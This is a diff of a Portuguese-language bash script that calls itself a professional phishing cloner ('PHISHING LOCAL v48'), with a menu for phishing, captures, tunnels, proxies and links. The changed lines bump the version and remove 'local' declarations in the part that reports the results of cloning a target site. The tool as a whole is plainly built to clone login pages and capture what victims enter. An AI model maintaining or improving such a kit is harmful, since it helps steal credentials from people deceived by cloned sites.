@@ -1,12 +1,12 @@
 #!/bin/bash
 # ============================================
-# 🎣 PHISHING LOCAL v45 - Clonador Profissional
+# 🎣 PHISHING LOCAL v48 - Clonador Profissional
 # 1 Phish 2 Capturas 3 Túnel 4 Histórico 5 Localhost 6 Link 7 Status 8 Parar 9 Proxy 0 Sair
 # ============================================
 
 RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
 CYAN='\033[0;36m'; PURPLE='\033[0;35m'; WHITE='\033[1;37m'; NC='\033[0m'
-VERSAO="45"
+VERSAO="48"
 
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 
@@ -1199,12 +1199,12 @@ while true; do
             echo ""
 
             # Salvar hora do inicio
-            local CLONE_START=$(date +%s)
+            CLONE_START=$(date +%s)
 
             clone_site "$URL" "$REDIR" "$PT" "$use_proxy"
 
-            local CLONE_END=$(date +%s)
-            local CLONE_ELAPSED=$((CLONE_END - CLONE_START))
+            CLONE_END=$(date +%s)
+            CLONE_ELAPSED=$((CLONE_END - CLONE_START))
 
             # Resultado
             echo ""
@@ -1212,12 +1212,12 @@ while true; do
             echo -e "  ${PURPLE}║          RESULTADO DO CLONE          ║${NC}"
             echo -e "  ${PURPLE}╚═══════════════════════════════════════╝${NC}"
 
-            local clone_sz=$(du -sh "$SITE_DIR" 2>/dev/null | cut -f1)
-            local html_sz=0; [ -f "$SITE_DIR/index.html" ] && html_sz=$(stat -c%s "$SITE_DIR/index.html" 2>/dev/null || echo 0)
-            local css_c=$(find "$SITE_DIR" -name "css_*" -type f 2>/dev/null | wc -l)
-            local js_c=$(find "$SITE_DIR" -name "js_*" -type f 2>/dev/null | wc -l)
-            local as_c=$(find "$SITE_DIR" -name "asset_*" -type f 2>/dev/null | wc -l)
-            local srv_state="OFF"; [ -f "$SCRIPT_DIR/.server.pid" ] && kill -0 "$(cat $SCRIPT_DIR/.server.pid)" 2>/dev/null && srv_state="ON"
+            clone_sz=$(du -sh "$SITE_DIR" 2>/dev/null | cut -f1)
+            html_sz=0; [ -f "$SITE_DIR/index.html" ] && html_sz=$(stat -c%s "$SITE_DIR/index.html" 2>/dev/null || echo 0)
+            css_c=$(find "$SITE_DIR" -name "css_*" -type f 2>/dev/null | wc -l)
+            js_c=$(find "$SITE_DIR" -name "js_*" -type f 2>/dev/null | wc -l)
+            as_c=$(find "$SITE_DIR" -name "asset_*" -type f 2>/dev/null | wc -l)
+            srv_state="OFF"; [ -f "$SCRIPT_DIR/.server.pid" ] && kill -0 "$(cat $SCRIPT_DIR/.server.pid)" 2>/dev/null && srv_state="ON"
 
             echo -e "  Tempo:    ${WHITE}${CLONE_ELAPSED}s${NC}"
             [ -n "$clone_sz" ] && echo -e "  Total:    ${GREEN}${clone_sz}${NC}"
@@ -1227,7 +1227,7 @@ while true; do
             [ "$as_c" -gt 0 ] && echo -e "  Assets:   ${GREEN}${as_c} arquivos${NC}"
             echo -e "  Servidor: ${srv_state}"
 
-            local curl_err=$(grep -ci "error\|curl" "$SCRIPT_DIR/curl.log" 2>/dev/null || echo 0)
+            curl_err=$(grep -ci "error\|curl" "$SCRIPT_DIR/curl.log" 2>/dev/null || echo 0)
             [ "$curl_err" -gt 0 ] && echo -e "  ${YELLOW}Erros curl: ${curl_err}${NC}"
 
             # Perguntar se quer salvar clone
@@ -1235,8 +1235,8 @@ while true; do
             echo -n "  Salvar clone pra biblioteca? (s/n): "
             read SAVE
             if echo "$SAVE" | grep -qi "^s"; then
-                local safe_url=$(echo "$URL" | sed -E 's|.*://||;s|[^a-zA-Z0-9._-]|_|g' | head -c 40)
-                local saved_path=$(save_clone "$safe_url" "$URL" "$REDIR" "$PT" "$use_proxy")
+                safe_url=$(echo "$URL" | sed -E 's|.*://||;s|[^a-zA-Z0-9._-]|_|g' | head -c 40)
+                saved_path=$(save_clone "$safe_url" "$URL" "$REDIR" "$PT" "$use_proxy")
                 if [ -n "$saved_path" ] && [ -d "$saved_path" ]; then
                     echo -e "  ${GREEN}[OK] Clone salvo! Use 'c' no menu.${NC}"
                 else
